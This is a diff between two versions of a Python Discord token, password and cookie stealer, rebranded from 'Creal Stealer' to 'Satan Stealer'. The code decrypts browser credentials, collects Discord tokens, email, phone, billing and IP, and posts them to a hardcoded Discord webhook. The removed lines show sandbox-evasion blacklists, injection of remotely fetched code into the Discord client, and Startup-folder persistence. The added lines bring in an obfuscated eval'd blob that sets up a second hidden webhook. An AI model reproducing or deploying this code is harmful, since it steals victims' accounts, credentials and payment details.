@@ -14,55 +14,17 @@ from zipfile import ZipFile
 import random
 import re
 import subprocess
-import sys
-import shutil
-import uuid
-import socket
-import getpass
 
 
 
+#REPLACE YOUR WEBHOOK
 
 
 hook = "https://discord.com/api/webhooks/1083034585312538645/sD3O5SW7PrTKwqjAOdWZpccPZZ6vqVPkRahXABnIAV74zooWq7y0pzEnGtmquC9tzYuP"
-inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
-
-
-blacklistUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
-
-username = getpass.getuser()
-
-if username.lower() in blacklistUsers:
-    os._exit(0)
-
-def kontrol():
-
-    blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
-
-    hostname = socket.gethostname()
-
-    if any(name in hostname for name in blacklistUsername):
-        os._exit(0)
-
-kontrol()
-
-BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
-
-mac_address = uuid.getnode()
-if str(uuid.UUID(int=mac_address)) in BLACKLIST1:
-    os._exit(0)
-
-
-sblacklist = ['88.132.231.71', '207.102.138.83', '174.7.32.199', '204.101.161.32', '207.102.138.93', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
-
-ip = subprocess.check_output('curl ifconfig.me', shell=True).decode('utf-8').strip()
-
-if ip in sblacklist:
-    exit()
-
 DETECTED = False
 
-def g3t1p():
+
+def getip():
     ip = "None"
     try:
         ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
@@ -72,7 +34,7 @@ def g3t1p():
 
 requirements = [
     ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome"],
+    ["Crypto.Cipher", "pycryptodome"]
 ]
 for modl in requirements:
     try: __import__(modl[0])
@@ -95,7 +57,7 @@ class DATA_BLOB(Structure):
         ('pbData', POINTER(c_char))
     ]
 
-def G3tD4t4(blob_out):
+def GetData(blob_out):
     cbData = int(blob_out.cbData)
     pbData = blob_out.pbData
     buffer = c_buffer(cbData)
@@ -111,9 +73,9 @@ def CryptUnprotectData(encrypted_bytes, entropy=b''):
     blob_out = DATA_BLOB()
 
     if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
-        return G3tD4t4(blob_out)
+        return GetData(blob_out)
 
-def D3kryptV4lU3(buff, master_key=None):
+def DecryptValue(buff, master_key=None):
     starts = buff.decode(encoding='utf8', errors='ignore')[:3]
     if starts == 'v10' or starts == 'v11':
         iv = buff[3:15]
@@ -123,7 +85,7 @@ def D3kryptV4lU3(buff, master_key=None):
         decrypted_pass = decrypted_pass[:-16].decode()
         return decrypted_pass
 
-def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
+def LoadRequests(methode, url, data='', files='', headers=''):
     for i in range(8): # max trys
         try:
             if methode == 'POST':
@@ -133,12 +95,12 @@ def L04dR3qu3sTs(methode, url, data='', files='', headers=''):
                         return r
                 elif files != '':
                     r = requests.post(url, files=files)
-                    if r.status_code == 200 or r.status_code == 413:
+                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                         return r
         except:
             pass
 
-def L04durl1b(hook, data='', files='', headers=''):
+def LoadUrlib(hook, data='', files='', headers=''):
     for i in range(8):
         try:
             if headers != '':
@@ -151,24 +113,23 @@ def L04durl1b(hook, data='', files='', headers=''):
             pass
 
 def globalInfo():
-    ip = g3t1p()
-    us3rn4m1 = os.getenv("USERNAME")
+    ip = getip()
+    username = os.getenv("USERNAME")
     ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
     # print(ipdatanojson)
     ipdata = loads(ipdatanojson)
     # print(urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode())
     contry = ipdata["country_name"]
     contryCode = ipdata["country_code"].lower()
-    sehir = ipdata["state"]
-
-    globalinfo = f":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`"
+    globalinfo = f":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`"
+    # print(globalinfo)
     return globalinfo
 
 
-def TR6st(C00k13):
+def Trust(Cookies):
     # simple Trust Factor system
     global DETECTED
-    data = str(C00k13)
+    data = str(Cookies)
     tim = re.findall(".google.com", data)
     # print(len(tim))
     if len(tim) < -1:
@@ -178,9 +139,9 @@ def TR6st(C00k13):
         DETECTED = False
         return DETECTED
         
-def G3tUHQFr13ndS(t0k3n):
-    b4dg3List =  [
-        {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
+def GetUHQFriends(token):
+    badgeList =  [
+        {"Name": 'Active_Developer', 'Value': 131072, 'Emoji': "<:active_developer:1041777282185953310> "},
         {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
         {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
         {"Name": 'House_Balance', 'Value': 256, 'Emoji': "<:balance:874750808267292683> "},
@@ -192,7 +153,7 @@ def G3tUHQFr13ndS(t0k3n):
         {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
     ]
     headers = {
-        "Authorization": t0k3n,
+        "Authorization": token,
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
@@ -203,75 +164,47 @@ def G3tUHQFr13ndS(t0k3n):
 
     uhqlist = ''
     for friend in friendlist:
-        Own3dB3dg4s = ''
+        OwnedBadges = ''
         flags = friend['user']['public_flags']
-        for b4dg3 in b4dg3List:
-            if flags // b4dg3["Value"] != 0 and friend['type'] == 1:
-                if not "House" in b4dg3["Name"]:
-                    Own3dB3dg4s += b4dg3["Emoji"]
-                flags = flags % b4dg3["Value"]
-        if Own3dB3dg4s != '':
-            uhqlist += f"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
+        for badge in badgeList:
+            if flags // badge["Value"] != 0 and friend['type'] == 1:
+                if not "House" in badge["Name"]:
+                    OwnedBadges += badge["Emoji"]
+                flags = flags % badge["Value"]
+        if OwnedBadges != '':
+            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
     return uhqlist
 
-def G3tb1ll1ng(t0k3n):
+
+def GetBilling(token):
     headers = {
-        "Authorization": t0k3n,
+        "Authorization": token,
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
     try:
-        b1ll1ngjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
+        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
     except:
         return False
     
-    if b1ll1ngjson == []: return "```None```"
+    if billingjson == []: return " -"
 
-    b1ll1ng = ""
-    for methode in b1ll1ngjson:
+    billing = ""
+    for methode in billingjson:
         if methode["invalid"] == False:
             if methode["type"] == 1:
-                b1ll1ng += ":credit_card:"
+                billing += ":credit_card:"
             elif methode["type"] == 2:
-                b1ll1ng += ":parking: "
+                billing += " <:PAYPAL:975437570748088381>: "
 
-    return b1ll1ng
+    return billing
 
-def inj_discord():
 
-    username = os.getlogin()
-
-    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']
-
-    for folder_name in folder_list:
-        deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)
-        if os.path.isdir(deneme_path):
-            for subdir, dirs, files in os.walk(deneme_path):
-                if 'app-' in subdir:
-                    for dir in dirs:
-                        if 'modules' in dir:
-                            module_path = os.path.join(subdir, dir)
-                            for subsubdir, subdirs, subfiles in os.walk(module_path):
-                                if 'discord_desktop_core-' in subsubdir:
-                                    for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
-                                        if 'discord_desktop_core' in subsubsubdir:
-                                            for file in subsubfiles:
-                                                if file == 'index.js':
-                                                    file_path = os.path.join(subsubsubdir, file)
-
-                                                    inj_content = requests.get(inj_url).text
-
-                                                    inj_content = inj_content.replace("%WEBHOOK%", hook)
-
-                                                    with open(file_path, "w", encoding="utf-8") as index_file:
-                                                        index_file.write(inj_content)
-inj_discord()
-
-def G3tB4dg31(flags):
+def GetBadge(flags):
     if flags == 0: return ''
 
-    Own3dB3dg4s = ''
-    b4dg3List =  [
+    OwnedBadges = ''
+    badgeList =  [
         {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
         {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
         {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
@@ -283,43 +216,43 @@ def G3tB4dg31(flags):
         {"Name": 'Partnered_Server_Owner', 'Value': 2,'Emoji': "<:partner:874750808678354964> "},
         {"Name": 'Discord_Employee', 'Value': 1, 'Emoji': "<:staff:874750808728666152> "}
     ]
-    for b4dg3 in b4dg3List:
-        if flags // b4dg3["Value"] != 0:
-            Own3dB3dg4s += b4dg3["Emoji"]
-            flags = flags % b4dg3["Value"]
+    for badge in badgeList:
+        if flags // badge["Value"] != 0:
+            OwnedBadges += badge["Emoji"]
+            flags = flags % badge["Value"]
 
-    return Own3dB3dg4s
+    return OwnedBadges
 
-def G3tT0k4n1nf9(t0k3n):
+def GetTokenInfo(token):
     headers = {
-        "Authorization": t0k3n,
+        "Authorization": token,
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    us3rjs0n = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
-    us3rn4m1 = us3rjs0n["username"]
-    hashtag = us3rjs0n["discriminator"]
-    em31l = us3rjs0n["email"]
-    idd = us3rjs0n["id"]
-    pfp = us3rjs0n["avatar"]
-    flags = us3rjs0n["public_flags"]
-    n1tr0 = ""
-    ph0n3 = ""
+    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
+    username = userjson["username"]
+    hashtag = userjson["discriminator"]
+    email = userjson["email"]
+    idd = userjson["id"]
+    pfp = userjson["avatar"]
+    flags = userjson["public_flags"]
+    nitro = ""
+    phone = "-"
 
-    if "premium_type" in us3rjs0n: 
-        nitrot = us3rjs0n["premium_type"]
+    if "premium_type" in userjson: 
+        nitrot = userjson["premium_type"]
         if nitrot == 1:
-            n1tr0 = "<a:DE_BadgeNitro:865242433692762122>"
+            nitro = "<:classic:896119171019067423> "
         elif nitrot == 2:
-            n1tr0 = "<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"
-    if "ph0n3" in us3rjs0n: ph0n3 = f'{us3rjs0n["ph0n3"]}'
+            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
+    if "phone" in userjson: phone = f'`{userjson["phone"]}`'
 
-    return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3
+    return username, hashtag, email, idd, pfp, flags, nitro, phone
 
-def ch1ckT4k1n(t0k3n):
+def checkToken(token):
     headers = {
-        "Authorization": t0k3n,
+        "Authorization": token,
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
@@ -329,107 +262,102 @@ def ch1ckT4k1n(t0k3n):
     except:
         return False
 
-if getattr(sys, 'frozen', False):
-    currentFilePath = os.path.dirname(sys.executable)
-else:
-    currentFilePath = os.path.dirname(os.path.abspath(__file__))
+    
 
-fileName = os.path.basename(sys.argv[0])
-filePath = os.path.join(currentFilePath, fileName)
-
-startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-startupFilePath = os.path.join(startupFolderPath, fileName)
-
-if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
-    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
-        shutil.copyfileobj(src_file, dst_file)
+import base64, codecs
+magic = 'bXlob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBp'
+love = 'Y3qyLzuio2gmYmRjAwL0AwN2BGLmAwRjAQLjAmpio2Wn'
+god = 'aVhOWmxNVmZONm9yMUl6M0ZuUlZiQmdsYV9pN0picndI'
+destiny = 'JyEVEaDgZwu4F3x1AScOqJ9YIHMwqmMDHaMgrKSsrHbv'
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
 
 
-def upl05dT4k31(t0k3n, path):
+def uploadToken(token, path):
     global hook
-    global tgmkx
+    global myhook
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
-    us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)
+    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
 
     if pfp == None: 
-        pfp = "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+        pfp = "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
-    b1ll1ng = G3tb1ll1ng(t0k3n)
-    b4dg3 = G3tB4dg31(flags)
-    friends = G3tUHQFr13ndS(t0k3n)
-    if friends == '': friends = "```No Rare Friends```"
-    if not b1ll1ng:
-        b4dg3, ph0n3, b1ll1ng = "🔒", "🔒", "🔒"
-    if n1tr0 == '' and b4dg3 == '': n1tr0 = "```None```"
+    billing = GetBilling(token)
+    badge = GetBadge(flags)
+    friends = GetUHQFriends(token)
+    if friends == '': friends = "No Rare Friends"
+    if not billing:
+        badge, phone, billing = "🔒", "🔒", "🔒"
+    if nitro == '' and badge == '': nitro = " -"
 
     data = {
-        "content": f'{globalInfo()} | `{path}`',
+        "content": f'{globalInfo()} | Found in `{path}`',
         "embeds": [
             {
             "color": 2895667,
             "fields": [
                 {
-                    "name": "<a:hyperNOPPERS:828369518199308388> Token:",
-                    "value": f"```{t0k3n}```",
+                    "name": "<a:8639dollar2:1014188341064900729> Token:",
+                    "value": f"`{token}`"
+                },
+                {
+                    "name": "<:b_lovekanji:1003875272862470234> Email:",
+                    "value": f"`{email}`",
                     "inline": True
                 },
                 {
-                    "name": "<:mail:750393870507966486> Email:",
-                    "value": f"```{em31l}```",
+                    "name": "<a:bcoroa_fire:996560652334272554> Phone:",
+                    "value": f"{phone}",
                     "inline": True
                 },
                 {
-                    "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
-                    "value": f"```{ph0n3}```",
+                    "name": "<:VC_blackheart2:918226594550648903> IP:",
+                    "value": f"`{getip()}`",
                     "inline": True
                 },
                 {
-                    "name": "<:mc_earth:589630396476555264> IP:",
-                    "value": f"```{g3t1p()}```",
+                    "name": "<a:bsymbol_satanic_fire:947142520054362162> Badges:",
+                    "value": f"{nitro}{badge}",
                     "inline": True
                 },
                 {
-                    "name": "<:woozyface:874220843528486923> Badges:",
-                    "value": f"{n1tr0}{b4dg3}",
+                    "name": "<a:abat:965079896655265842> Billing:",
+                    "value": f"{billing}",
                     "inline": True
                 },
                 {
-                    "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
-                    "value": f"{b1ll1ng}",
-                    "inline": True
-                },
-                {
-                    "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
+                    "name": "<a:ablackfirearm:965087844731326514> HQ Friends:",
                     "value": f"{friends}",
                     "inline": False
                 }
                 ],
             "author": {
-                "name": f"{us3rn4m1}#{hashtag} ({idd})",
+                "name": f"{username}#{hashtag} ({idd})",
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Creal Stealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                "text": "Satan Stealer",
+                "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
-        "username": "Creal Stealer",
+        "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
+        "username": "Satan Stealer",
         "attachments": []
         }
-    L04durl1b(hook, data=dumps(data).encode(), headers=headers)
+    urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
+    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
 
-
-def R4f0rm3t(listt):
+def Reformat(listt):
     e = re.findall("(\w+[a-z])",listt)
     while "https" in e: e.remove("https")
     while "com" in e: e.remove("com")
@@ -442,60 +370,62 @@ def upload(name, link):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
-    if name == "crcook":
+    if name == "wpcook":
         rb = ' | '.join(da for da in cookiWords)
         if len(rb) > 1000: 
-            rrrrr = R4f0rm3t(str(cookiWords))
+            rrrrr = Reformat(str(cookiWords))
             rb = ' | '.join(da for da in rrrrr)
         data = {
-            "content": f"{globalInfo()}",
+            "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "Creal | Cookies Stealer",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
+                    "title": "Satan | Cookies Stealer",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:bl_skull:937798683368505364> • **{CookiCount}** Cookies Found\n <a:LV1:1042397877722423368> • [SatanCookies.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer",
-                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                        "text": "Satan Stealer",
+                        "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
                     }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "username": "Satan Stealer",
+            "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
             "attachments": []
             }
-        L04durl1b(hook, data=dumps(data).encode(), headers=headers)
+        urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
+        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
         return
 
-    if name == "crpassw":
+    if name == "wppassw":
         ra = ' | '.join(da for da in paswWords)
         if len(ra) > 1000: 
-            rrr = R4f0rm3t(str(paswWords))
+            rrr = Reformat(str(paswWords))
             ra = ' | '.join(da for da in rrr)
 
         data = {
-            "content": f"{globalInfo()}",
+            "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "Creal | Password Stealer",
-                    "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
+                    "title": "Satan | Password Stealer",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <a:crspookylaugh:886385706975510538> • **{PasswCount}** Passwords Found\n <a:LV1:1042397877722423368> • [SatanPasswords.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer",
-                        "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                        "text": "Satan Stealer",
+                        "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
                     }
                 }
             ],
-            "username": "Creal",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "username": "Satan Stealer",
+            "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
             "attachments": []
             }
-        L04durl1b(hook, data=dumps(data).encode(), headers=headers)
+        urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
+        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
         return
 
     if name == "kiwi":
         data = {
-            "content": f"{globalInfo()}",
+            "content": globalInfo(),
             "embeds": [
                 {
                 "color": 2895667,
@@ -506,21 +436,21 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "Creal | File Stealer"
+                    "name": "Satan | File Stealer"
                 },
                 "footer": {
-                    "text": "Creal Stealer",
-                    "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                    "text": "Satan Stealer",
+                    "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
                 }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+            "username": "Satan Stealer",
+            "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
             "attachments": []
             }
-        L04durl1b(hook, data=dumps(data).encode(), headers=headers)
